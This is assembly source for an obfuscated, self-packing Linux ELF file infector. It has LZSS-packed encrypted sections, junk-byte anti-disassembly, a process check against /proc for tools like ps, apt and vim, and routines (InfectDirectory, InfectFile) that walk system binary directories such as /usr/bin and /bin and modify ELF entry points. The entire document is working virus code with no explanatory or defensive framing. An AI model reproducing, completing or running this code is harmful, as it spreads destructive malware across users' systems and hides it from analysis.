    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0x75
    js          ..@Zwnv0hp9ENud
    jns         ..@Zwnv0hp9ENud
..@0DlsA42QeGSr:
    pop         rbx
    jmp         $+5
db 0x5d, 0xfa, 0xca
    jmp         $+4
db 0x40, 0xe2
    jl          ..@6fX7XVwLFWMu
    jge         ..@6fX7XVwLFWMu
..@h0NOzSkMCUtR:
    rep         nop
    xor         rdi, rdi
    jmp         $+5
db 0xd6, 0xea, 0xa4
    jmp         $+4
db 0x74, 0x6c
    jl          ..@vmtakpXsgZNU
    jge         ..@vmtakpXsgZNU
..@uO6coQUvsQps:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         ..@bKNnqqZkDdKz
..@DCfRLy0PinIy:
    jl          ..@POXXIxDK4Q79
    test        eax, eax
    jmp         $+5
db 0x24, 0x05, 0xcc
    jmp         ..@SZh5pMPv9wRg
..@VjAbp6RYKQ65:
    mov         rdx, rdx
    jmp         $+5
db 0xed, 0xfc, 0xcf
    jl          ..@mdWNhssWd0hJ
    jge         ..@mdWNhssWd0hJ
..@vmtakpXsgZNU:
    call        ExitProgram
    js          ..@txFGTsJ8rhWq
    jns         ..@txFGTsJ8rhWq
..@LvKxX5xw8Szr:
    xchg        rax, rax
    cmp         DWORD [r5], 0x00000000
    jmp         $+5
db 0xbf, 0x39, 0x44
    jmp         $+4
db 0x4b, 0xc2
    js          ..@0H2E7PnMrnUu
    jns         ..@0H2E7PnMrnUu
LzssDecoder:
    jmp         ..@Ej3FXi4ITK67
..@zsZUAMCDMvSE:
    jmp         ..@DdFCQqLXbh0H
    js          ..@atzeETbffL5H
    jns         ..@atzeETbffL5H
..@pMWyCjA3mYjf:
    mov         rbx, rbx
    jmp         ..@oxwOx6PJT7i2
..@c9VbTTiAhPcR:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
%endif
    jmp         $+3
db 0x94
    jmp         $+5
db 0xf0, 0xc4, 0x92
    jb          ..@yfSYYfpCk7b7
    jae         ..@yfSYYfpCk7b7
..@BPTQLycKJRO8:
    jmp         ..@8rVNw2qg5V6q
    jl          ..@LJQoP1aSz7U1
    jge         ..@LJQoP1aSz7U1
..@8n3ABAKbRkEV:
    xor         r3, r3
    xor         r4, r4
    xchg        rcx, rcx
    jmp         ..@sPKeUatnF1tu
..@52jEseTk4LWw:
    je          ..@atzeETbffL5H
    jmp         ..@SCmQdtLmHk7p
..@5YzYjbErOH2Z:
    syscall
    jl          ..@QKBp2NKsmeWH
    jge         ..@QKBp2NKsmeWH
..@1nvtDilH4Qwr:
    mov         rax, 0x20
    rep         nop
    rep         stosb
    jl          ..@F6BfAUhko3Xf
    jge         ..@F6BfAUhko3Xf

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs:
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@Hd7NU5FlVpq1
..@A2m2ULMFhfLu:
%ifdef X86_32
    pop         ebp
%endif
    jmp         ..@OfRujjcayvRq
..@vnu58hKoCSAj:
    mov         rbp, rbp
    jmp         $+3
db 0x59
    jmp         ..@IdqfeDkS3VpU
..@yI0wYCOcV3wH:
    mov         r1, r5
    js          ..@amCiHzRDFP9n
    jns         ..@amCiHzRDFP9n
..@Ayr3VRZfJ9PT:
    push        rdi
    push        rbx
    jmp         $+4
db 0x33, 0x65
    jmp         $+5
db 0x3e, 0xb0, 0xe5
    jmp         ..@wwqLRCRIGBtd
..@P8mLvoXXQcCJ:
    mov         eax, 0x00
    jmp         $+5
db 0x7d, 0x3a, 0x0a
    js          ..@OBzaYpoSJlxy
    jns         ..@OBzaYpoSJlxy
..@E5Jh1FNjOwGx:
    mov         rbp, rbp
    jmp         $+5
db 0xaa, 0x1e, 0x84
    jmp         ..@BQcIblMponhm
..@Ci7VT2TggIGm:
    syscall
    jmp         $+4
db 0x13, 0x1a
    jmp         $+5
db 0x95, 0x50, 0x28
    jmp         ..@VPHpJ840Vo6T
..@nSai0jVA1EE1:
    xchg        rsi, rsi
    jmp         $+5
db 0x82, 0x70, 0x08
    jmp         $+3
db 0x50
    jmp         ..@DYp4u77rHkIN
..@WNfLURkaXBay:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    jmp         $+4
db 0x7d, 0x8c
    jmp         $+4
db 0x05, 0xac
    jl          ..@NabHQU1caRLx
    jge         ..@NabHQU1caRLx
..@K7LLFwx4KTqh:
    push        rax
    pop         rax
    cmp         BYTE [r1+5], '/'
    jl          ..@c2NP2yfSUSjQ
    jge         ..@c2NP2yfSUSjQ
..@iui0JI6DDaHi:
    add         rsp, _INFDIR_OFF_size
    jb          ..@mpQDvjCdcudv
    jae         ..@mpQDvjCdcudv
..@2OX9vVvO6liV:
    mov         QWORD [r5+file.filesize], r3
    jmp         $+5
db 0x09, 0x91, 0x67
    jmp         $+3
db 0x62
    jmp         $+5
db 0xf1, 0xe4, 0x4c
    jl          ..@9emTXX8fVjxm
    jge         ..@9emTXX8fVjxm
..@FQfT8rCne0ub:
    mov         rax, rax
    jmp         $+4
db 0xc1, 0x34
    jmp         $+5
db 0xc0, 0xe4, 0xaf
    jmp         ..@iZr91lyz41AA
..@1WdljG0TCTof:
    xor         rax, rax
    ret
    jl          ..@0E9EOBhPhJ9Q
    jge         ..@0E9EOBhPhJ9Q
..@EAhcLZOvScv9:
    sub         dl, cl
    jmp         $+4
db 0x8c, 0x6a
    jb          ..@esfOVIlYGcC5
    jae         ..@esfOVIlYGcC5
..@9IEowmpQxE0Y:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jmp         ..@ccsPLFgSVuER
..@oJ4YAeIywyUs:
    jle         ..@58T9lA0lkm5e
    mov         QWORD [r5+file.filesize], rax
    jmp         $+5
db 0x74, 0x96, 0xe0
    jmp         ..@bs8XquEasxfs
..@o4EgniIRO42R:
%ifdef X86_64
    pop         rbx
%endif
    jmp         $+3
db 0x23
    jb          ..@Ob22G9IQyRq1
    jae         ..@Ob22G9IQyRq1
..@LgouUSxXqQrg:
    cmp         BYTE [r1], '/'
    jmp         $+3
db 0x38
    jb          ..@3ZzhFSRu18de
    jae         ..@3ZzhFSRu18de
..@s01BYyyLYxwt:
    xor         r1, r1
    CFILE       DWORD [r5+file.filefd]
    mov         DWORD [r5+file.filefd], 0x00
    jmp         $+4
db 0xae, 0x4f
    js          ..@GhAmVZVMNP7x
    jns         ..@GhAmVZVMNP7x
..@wvXRqA6tLe6f:
    xor         rax, rax
    jb          ..@eJVldatVQmwL
    jae         ..@eJVldatVQmwL
..@BQcIblMponhm:
    add         rdi, rcx
    add         rsi, rcx
    jmp         $+5
db 0xe1, 0xd0, 0x06
    jb          ..@omiCjy8sMk8v
    jae         ..@omiCjy8sMk8v
..@iD8mvke3y8Se:
    je          ..@zHh3SfBY21Uy
    mov         r2d, DWORD [r1]
    and         r2, 0x00ffffff
    jmp         $+4
db 0xd1, 0xd1
    jmp         $+5
db 0x0a, 0x59, 0xfa
    je          ..@gdeQf9OuYrNe
    jne         ..@gdeQf9OuYrNe
..@sykVVZLGaWbf:
    jz          ..@0E9EOBhPhJ9Q
    jmp         $+5
db 0xd7, 0x95, 0xbc
    jmp         $+5
db 0x20, 0x00, 0x06
    js          ..@Z32LuM8mRWpQ
    jns         ..@Z32LuM8mRWpQ
..@4TaQvtz1RjKg:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xor         rax, rax
    jmp         $+4
db 0x87, 0x34
    jb          ..@fYXrHkQMMYzn
    jae         ..@fYXrHkQMMYzn
..@Yf14XFTCHJlT:
    test        eax, eax
    jmp         $+5
db 0x37, 0x95, 0x90
    jmp         ..@8ry8U4ik2DL1
..@EmqdTAJ6goxw:
    cmp         BYTE [r5], DT_DIR
    jmp         $+5
db 0xb9, 0x61, 0x83
    jmp         $+5
db 0xe8, 0x7b, 0x6b
    jb          ..@Dv77GuySem57
    jae         ..@Dv77GuySem57
..@Du4x2O04ctVR:
    mov         rdi, QWORD [r5+file.fileptr]
    mov         eax, 0x0
    jmp         $+4
db 0xe6, 0x27
    je          ..@tRq7C2D5LgpH
    jne         ..@tRq7C2D5LgpH
..@qNhGjBqzIxtV:
    xchg        rcx, rcx
    jmp         $+3
db 0x95
    jb          ..@rLJPykzAhemM
    jae         ..@rLJPykzAhemM
..@ETao9RplJ7Hj:
    je          ..@x678uq32skNY
    jmp         $+4
db 0x43, 0xb6
    jmp         $+4
db 0x53, 0x28
    jmp         $+5
db 0xca, 0x35, 0x65
    jmp         $+4
db 0xf3, 0xf9
    jmp         ..@nKG2hjWbU3Ki
..@bQBMV33Wxr01:
    syscall
    jmp         $+4
db 0xa2, 0xce
    jl          ..@eUyy9HbLeghL
    jge         ..@eUyy9HbLeghL
..@746X1KaE7DIz:
    pop         rbx
    jb          ..@qqlo3acAyvaz
    jae         ..@qqlo3acAyvaz
..@jbpSZdV8DMPq:
    cmp         al, 0xa
    jmp         $+5
db 0x18, 0xc1, 0xa4
    jmp         $+5
db 0x08, 0x8b, 0xd7
    jmp         ..@kucLIaQUiMo1
..@39HoCT5vqkh5:
    mov         rsp, rsp
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         ..@GREQkxTrfSmB
..@J0lRjkOK7srU:
    xor         rax, rax
    jmp         ..@r9cJrHY8FJZx
..@0R1Qd6CRFoSS:
    mov         rdi, rdi
    xchg        rdi, rdi
    mov         rsi, r5
    js          ..@EYMud74r5Xa8
    jns         ..@EYMud74r5Xa8
InfectDirectory:
    jmp         ..@dRrZMQJ4o0Vj
..@nJdKBFye7Yrm:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_entry]
    test        r2, r2
    jl          ..@QjCODqD09rKI
    jge         ..@QjCODqD09rKI
..@Uw7hLHUumqxJ:
    add         r1, r4
    jmp         $+3
db 0xa9
    jmp         $+5
db 0x97, 0x13, 0x33
    jmp         ..@AImKnXiA0mAF
..@bCYVuOKD8RVx:
    xchg        rax, rax
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jge         ..@x678uq32skNY
    jb          ..@AnXj6cEfolAg
    jae         ..@AnXj6cEfolAg
..@y8efAumHZRb1:
    pop         rdi
    jb          ..@DXwWwrBudibD
    jae         ..@DXwWwrBudibD
..@OKvCbDNWy0DU:
    xor         rax, rax
    je          ..@fKGmJblrh4YH
    jne         ..@fKGmJblrh4YH
..@caQKIcVnG4yx:
    jmp         ..@JljPYnYRVDo0
    jl          ..@WdnBKIHvj00q
    jge         ..@WdnBKIHvj00q
..@NGIHe7zYbrQs:
    jmp         ..@yI0wYCOcV3wH
    jl          ..@rXpJi4iQWVbI
    jge         ..@rXpJi4iQWVbI
..@HzfFa4jCmga7:
    pop         rcx
    cmp         BYTE [r1+16], ET_DYN
    mov         rsi, rsi
    je          ..@aV71XXfUktVK
    jne         ..@aV71XXfUktVK
..@7r864M8HvvJp:
    xor         rax, rax
    jmp         $+5
db 0xfb, 0x8c, 0x69
    jb          ..@0ReH9wdXf7pY
    jae         ..@0ReH9wdXf7pY
..@w3dVRQjTZfcN:
    xor         rcx, rcx
    jmp         ..@yENwsKS1L2on
..@PWVLJZQTMpFs:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         ..@7c1hPO05UnRK
..@BipVKw2y5pRi:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    je          ..@hWFs1zKOSE6m
    jne         ..@hWFs1zKOSE6m
..@GRu3Bjow697u:
    jmp         ..@NpNNNmu2UWzz
    jmp         $+5
db 0x0c, 0xf6, 0x46
    jmp         ..@jyTrN3WX2YPX
..@pHXb6vZSWCYz:
    mov         rsi, rdi
    add         rdi, rbx
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+5
db 0x3f, 0x3d, 0x8d
    jb          ..@gjvQRP4RSpnw
    jae         ..@gjvQRP4RSpnw
..@adXfZDfJGbYb:
    je          ..@aEkuGWh9Oe7T
    jmp         $+3
db 0x71
    js          ..@GTbCPZkOlSNq
    jns         ..@GTbCPZkOlSNq
..@qCoXzAxXPp7k:
    push        r4
    push        r5
    jb          ..@HX9pZmbBRkLj
    jae         ..@HX9pZmbBRkLj
..@AaPWyLmjE5ZB:
    call        FileValidation
    push        rdx
    jl          ..@ogXzyfTzHkBe
    jge         ..@ogXzyfTzHkBe
..@iXQBX8UWUztC:
    xchg        rsi, rsi
    jmp         $+5
db 0x66, 0x50, 0xb5
    js          ..@UevBXpGdPgMG
    jns         ..@UevBXpGdPgMG
..@oo3HmVqUemuR:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    call        InfectFile
    jmp         $+4
db 0xef, 0x7b
    jb          ..@zHh3SfBY21Uy
    jae         ..@zHh3SfBY21Uy
..@U61COKN4m95u:
    pop         r3
    pop         r2
    xchg        rdx, rdx
    jb          ..@teF9owBr1LKq
    jae         ..@teF9owBr1LKq
..@HX9pZmbBRkLj:
    xor         r4, r4
    jmp         $+5
db 0xde, 0x34, 0x7d
    jmp         $+4
db 0xca, 0x81
    jb          ..@CiJUnDybPm8M
    jae         ..@CiJUnDybPm8M
..@mbZ4YlONkY5T:
    add         rax, bytes
    jmp         $+3
db 0x4a
    jb          ..@bFTDzU9Zmmrn
    jae         ..@bFTDzU9Zmmrn
..@8GWRgYD1l1V0:
    cmp         WORD [r1], '..'
    je          ..@zHh3SfBY21Uy
    jmp         $+4
db 0x09, 0xa0
    jmp         $+4
db 0xf2, 0xd3
    jmp         $+5
db 0x8f, 0x20, 0x85
    jmp         $+5
db 0x81, 0x9a, 0x2c
    jl          ..@HRVT6iaO9BuI
    jge         ..@HRVT6iaO9BuI
..@AHl620MnrLI3:
    jnz         ..@mgQZmrmNBHsf
    jmp         ..@9VgQSZvIuChs
    jmp         $+4
db 0x2c, 0xc2
    js          ..@xBcT6iT9t73X
    jns         ..@xBcT6iT9t73X
..@dRrZMQJ4o0Vj:
    sub         rsp, _INFDIR_OFF_size
    jmp         $+4
db 0x2a, 0xc5
    jl          ..@IkkT2rPyHK4G
    jge         ..@IkkT2rPyHK4G
..@PSPE0GtY4xgT:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jle         ..@Y1mcwQ4av2WX
    jmp         ..@gXyycPkL22iD
..@pob48cfeFggl:
    add         rcx, 2*bytes
    jmp         $+4
db 0xe9, 0x81
    jmp         ..@aOkcZ3bOqDTw
..@KSXiOpkJ4b9F:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@EwmZfFYr52z5
..@jyTrN3WX2YPX:
    mov         rbx, rbx
    jmp         $+5
db 0x87, 0x71, 0x56
    jmp         $+4
db 0x0a, 0xf7
    jmp         ..@udRymWsTVKJs
..@C8d191RRST4a:
    je          ..@lAVOTGw42AA4
    jmp         $+3
db 0xe7
    jmp         $+3
db 0x7d
    jmp         ..@kEK0EBccCruF
..@EwmZfFYr52z5:
    add         r1, signature_len-1
    jb          ..@78G1UyMmQsUm
    jae         ..@78G1UyMmQsUm
..@PmRocgDvVvDU:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    push        rdi
    push        rdx
    jmp         $+4
db 0x3a, 0xff
    jb          ..@QcQJSK8xgr6y
    jae         ..@QcQJSK8xgr6y
..@H0XbzeTcHL1a:
    jne         ..@pob48cfeFggl
    mov         rax, QWORD [rsi+rcx+bytes]
    and         rax, DF_1_PIE
    jmp         ..@Yf14XFTCHJlT
..@pyOSP8d0llot:
    pop         rbx
    xor         rcx, rcx
    jl          ..@Eq7nA7XuCBT2
    jge         ..@Eq7nA7XuCBT2
..@RQzkSN9gMfxZ:
    add         r2, rax
    jmp         $+5
db 0x96, 0x34, 0x74
    jmp         ..@FWaMmvPASkuV
..@ACsDVpFt883j:
    xchg        rdx, rdx
    mov         rdx, rdx
    jmp         ..@bbtHdPWmbOx6
..@B1ZnTt5C7H7w:
    mov         QWORD [rdi], rsi
    xor         rax, rax
    jmp         $+3
db 0x28
    jmp         $+4
db 0x74, 0x4a
    jmp         $+3
db 0x12
    jmp         $+3
db 0xf8
    jmp         $+3
db 0x86
    jmp         ..@w3dVRQjTZfcN
..@NFlECR6WCCgX:
%ifdef X86_32
    mov         rdx, rdx
    mov         rcx, rcx
    push        rdx
%endif
    jmp         $+3
db 0xd3
    jb          ..@pWgkRLozKrSE
    jae         ..@pWgkRLozKrSE
..@Y3VfVm3f17LP:
    add         rax, r1
    jmp         $+3
db 0x51
    jmp         $+5
db 0x50, 0x5c, 0x4b
    jmp         ..@0IUqIA15Ck5N
..@vsx075w38aZZ:
    mov         eax, 0x00
    jb          ..@0G3YudtssGmi
    jae         ..@0G3YudtssGmi
..@wUyWeUjsMWPa:
    sub         rcx, m6
    js          ..@P8mLvoXXQcCJ
    jns         ..@P8mLvoXXQcCJ
..@T2wpTqJE1Q6W:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    jmp         $+4
db 0x47, 0xc8
    jmp         $+3
db 0xf3
    jl          ..@1VSTIvHlvBYO
    jge         ..@1VSTIvHlvBYO
..@1LdTJKuzqFJm:
    call        InfectDirectory
    jl          ..@WHu075FUONVe
    jge         ..@WHu075FUONVe
..@GDesmzQ2pwYN:
    je          ..@XIKBOzOaXtSP
    jmp         $+5
db 0x05, 0x7b, 0x1b
    jmp         $+4
db 0xe8, 0xe2
    js          ..@dhBd2QkTe5hF
    jns         ..@dhBd2QkTe5hF
..@2BewgiO3waBn:
    pop         rsi
    test        al, al
    jmp         $+5
db 0x54, 0xce, 0xd5
    jb          ..@AHl620MnrLI3
    jae         ..@AHl620MnrLI3
..@rtT8ffMk6fOT:
    mov         rdi, m6
    jmp         $+3
db 0xf9
    jmp         ..@Df2xaX41eULK
..@r9cJrHY8FJZx:
    mov         rdx, rdx
    add         rsp, _DYNPIE_OFF_size
    pop         r2
    jb          ..@tlplPr5G1fXq
    jae         ..@tlplPr5G1fXq
..@Q4BM2ArC3GNA:
    pop         r5
    ret
    jmp         MemMove
..@DXwWwrBudibD:
    pop         r1
    cmp         r1, 0x00
    jmp         $+4
db 0x89, 0x61
    js          ..@b0q9PPAaw47q
    jns         ..@b0q9PPAaw47q
..@sLg6suZWKdAm:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    rep         movsb
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jl          ..@zOkjhDLcQyD3
    jge         ..@zOkjhDLcQyD3
..@X6Jja6ec3Lx1:
    xor         rcx, rcx
    xor         rdx, rdx
    jmp         $+3
db 0xf1
    jmp         $+3
db 0xdf
    jmp         ..@OKvCbDNWy0DU
..@29w9oKc1yexY:
    mov         DWORD [rdi], esi
    add         rdi, 0x4
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    jb          ..@B1ZnTt5C7H7w
    jae         ..@B1ZnTt5C7H7w
..@5MSM4SLs05zp:
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@Twt8qn8J53By
    jmp         ..@HeqSKP2SyKH3
..@DoBXSymAQvK2:
    mov         r5, [rsp+_NBF_OFF.file]
    jl          ..@xErsDdmXNlVz
    jge         ..@xErsDdmXNlVz
..@cxcK3uoqsltW:
    mov         r2, 0x100
    jmp         ..@IZa1LqHfhiQI
..@IroSS4NZDo8d:
    mov         r1, r5
    call_vsp    Strlen
    jmp         $+3
db 0xe8
    jmp         ..@drCjZsGrh4I7
..@Zy8eDcuGSisj:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@ckR9TPE2NNeY
..@gbPUmsQZyzai:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         ..@GMJd33RRNoMC
..@Hd7NU5FlVpq1:
    sub         rsp, _PROC_OFF_size
    js          ..@YQBdDLq3yH5A
    jns         ..@YQBdDLq3yH5A
..@dhBd2QkTe5hF:
    cmp         rax, 0x01
    jmp         ..@EZUssc99on1a
..@tqvRxALA2E6h:
    mov         rcx, rcx
    jmp         $+5
db 0xf3, 0xa0, 0x2b
    jmp         $+3
db 0x59
    jl          ..@wvXRqA6tLe6f
    jge         ..@wvXRqA6tLe6f
..@zvw3m56e56nc:
    mov         rsi, rsi
    jmp         $+3
db 0x4b
    jmp         $+4
db 0x56, 0x11
    jl          ..@4mxahrRxYbh1
    jge         ..@4mxahrRxYbh1
..@KvXBD9vLoeJD:
    pop         rdi
    jmp         ..@npIPjj9aMD8b
..@7ZGwUfEYfYIX:
    pop         rbx
    jmp         ..@0f0KoW0Kpare
..@Twz48MIQwywF:
    xor         r1, r1
    jmp         $+4
db 0xd2, 0x11
    jl          ..@4tpgDHwdl29l
    jge         ..@4tpgDHwdl29l
..@nWKyMkIndYlI:
    cmp         eax, 0x3
    jle         ..@7H4hQvxeVdOX
    jmp         $+5
db 0x0b, 0x8d, 0x55
    jmp         $+3
db 0x47
    jmp         ..@fWp2BQflbHvf
..@hWOlrRgbJQ4m:
    mov         rcx, rcx
    jmp         $+3
db 0x42
    jl          ..@NDoVGHwVEeF9
    jge         ..@NDoVGHwVEeF9
..@TfnXlY9oK4M2:
    pop         r1
    jmp         ..@GVxcrYjKBWpv
..@dfAqAT2EaJ2k:
    push        rbx
    jmp         $+4
db 0x32, 0x1e
    jmp         ..@pyOSP8d0llot
..@HeqSKP2SyKH3:
    xchg        rcx, rcx
    jl          ..@C6vABtxSVoto
    jge         ..@C6vABtxSVoto
..@fYXrHkQMMYzn:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    add         r5, rax
    jmp         $+3
db 0x05
    jmp         ..@f74dNVmPwNpr
..@b6sJoD7UeYrq:
    xor         rax, rax
    je          ..@n1BL75UNoqMn
    jne         ..@n1BL75UNoqMn
..@WmpPX9fMq6My:
%ifdef X86_64
    pop         rbx
%endif
    jmp         ..@zfxpGRZKFM4K
..@Twt8qn8J53By:
    sub         ebx, 1
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jge         ..@HeqSKP2SyKH3
    js          ..@KKuoEcPfZInN
    jns         ..@KKuoEcPfZInN
..@YEscLRPRa2dm:
    ret
    jmp         $+4
db 0xf8, 0x20
    jmp         $+5
db 0x9f, 0xc2, 0x9b
    js          AddSizeMappedFile
    jns         AddSizeMappedFile
..@Bn767kiUyVbC:
    xor         rax, rax
    jmp         $+4
db 0x20, 0x01
    jmp         ..@wdlQEmBPYHUf
..@7MqwyhlPdwBH:
    mov         BYTE [r1], 0x00
    mov         rdx, rdx
    jl          ..@oo3HmVqUemuR
    jge         ..@oo3HmVqUemuR
..@mea0wkEUj04f:
    jmp         ..@0f0KoW0Kpare
    jmp         $+3
db 0x43
    jmp         $+4
db 0x58, 0xec
    jb          ..@O8DJ8jrXxhyD
    jae         ..@O8DJ8jrXxhyD
..@GTbCPZkOlSNq:
    xor         r3, r3
    xchg        rsi, rsi
    mov         m6, rax
    jb          ..@lbeJtoZSP47z
    jae         ..@lbeJtoZSP47z
..@ybS1gu6do7p0:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jl          ..@EHSPv4udHMjw
    jge         ..@EHSPv4udHMjw
..@JqkIzVRyuptr:
    xor         rdi, rdi
    js          ..@XOj9K8gKPQCF
    jns         ..@XOj9K8gKPQCF
..@KwEfaIICblyD:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    je          ..@Mrikde4YrZUL
    jne         ..@Mrikde4YrZUL
..@XEYWxJZ7PUIZ:
    mov         rsp, rsp
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+5
db 0x25, 0xc8, 0xcf
    jmp         ..@LFzp3sdForQ0
..@nFavDogu3CtJ:
    call        Strcpy
    jmp         $+4
db 0xc5, 0x14
    jmp         $+4
db 0x2e, 0xef
    js          ..@8XuUzLzcwkME
    jns         ..@8XuUzLzcwkME
..@5dYoW44THoap:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jmp         ..@41Lt0WdqdW5Z
..@9emTXX8fVjxm:
    jmp         ..@hcDALAwtCx2I
    jmp         $+3
db 0xe6
    jl          ..@X23B55n7TLHM
    jge         ..@X23B55n7TLHM
..@GSGfXLem6vGQ:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    jb          ..@hL0x2lZGGaD9
    jae         ..@hL0x2lZGGaD9
..@zrazFhVRUNRv:
    cmp         rax, 0
    jne         ..@8fl0P9Y6duTk
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+3
db 0x4f
    jmp         $+5
db 0x41, 0xa9, 0x3a
    jb          ..@REK2DE0EhSfx
    jae         ..@REK2DE0EhSfx
..@BVQn395gesjp:
    cmp         rax, 0x00
    jmp         $+3
db 0xe9
    jmp         ..@JMasbVVHyIER
..@AL4SMjg6WBEA:
    or          bx, ax
    jb          ..@VdNme6HvNsLW
    jae         ..@VdNme6HvNsLW
..@6B7yWbQhKRDj:
    push        rbx
    pop         rbx
    js          ..@q1OjV2AmzoQd
    jns         ..@q1OjV2AmzoQd
..@JljPYnYRVDo0:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+5
db 0xc6, 0xd2, 0xec
    jmp         $+5
db 0xb4, 0x45, 0xe4
    js          ..@jb5q4M8O5rle
    jns         ..@jb5q4M8O5rle
..@De10iMjdmIbl:
    xor         rdx, rdx
    je          ..@BWa4EFRpuWcW
    jne         ..@BWa4EFRpuWcW
..@ZwDJPT2e672Y:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    mov         r1, r5
    mov         rax, rax
    jmp         $+3
db 0xf1
    jmp         ..@CFHg47faWpBj
..@b0q9PPAaw47q:
    je          ..@9t27meM0CY4w
    jmp         ..@tIkW0Jh4q3NS
..@2upU3nWzMhKd:
    add         rax, r2
    jmp         $+4
db 0xb7, 0xb3
    js          ..@BN7Oj3MGxvAd
    jns         ..@BN7Oj3MGxvAd
..@gYQubx5PcbNa:
    cmp         rax, 0x02
    jmp         $+3
db 0xa5
    js          ..@GqXXYh9p2LH7
    jns         ..@GqXXYh9p2LH7
..@S30C6w8z62z5:
    push        rdi
    pop         rdi
    pop         rdx
    jmp         $+5
db 0x77, 0x50, 0x24
    jl          ..@GIBmUQ3Pape3
    jge         ..@GIBmUQ3Pape3
IsNum:
    jmp         ..@b6sJoD7UeYrq
..@ec5htoyiENrE:
    xor         rcx, rcx
    mov         rdi, m6
    mov         rcx, m7
    jmp         ..@wUyWeUjsMWPa
..@NSopybDnEC3V:
    jmp         ..@n1BL75UNoqMn
    jmp         $+5
db 0xf6, 0x51, 0x65
    jmp         ..@1WdljG0TCTof
..@buReGTH4bdzF:
    ret
    jmp         $+4
db 0x9c, 0x1a
    jmp         $+4
db 0x62, 0xe6
    jmp         ..@uVVpSXTwoi4l
..@Q5yrxvzRQWlT:
    jmp         ..@7AdCCb3OYeKF
    jmp         $+4
db 0xea, 0xa6
    jmp         ..@58T9lA0lkm5e
